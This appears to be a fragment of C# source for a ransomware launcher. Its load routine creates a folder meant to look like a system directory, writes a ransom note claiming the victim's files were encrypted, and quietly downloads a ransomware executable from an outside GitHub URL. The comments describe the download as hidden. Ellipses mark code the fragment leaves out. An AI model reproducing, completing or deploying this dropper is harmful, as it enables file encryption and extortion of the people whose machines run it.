...
namespace launcher
{
    public  class launcher2 
    {
        ...
        private void launcher2_Load()
        {

            Directory.CreateDirectory("C:\\Program Files\\System32"); //Create Folder
            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by g27, good luck..."); //Create text file :-)
            ...
            webClient.DownloadFile("https://raw.githubusercontent.com/Jorge-Duran-Pinto/Ransonware2.0/master/Ransonware2.0.exe", @"C:\Program Files\System32\Ransonware2.0.exe"); //Hide donwloading :-)
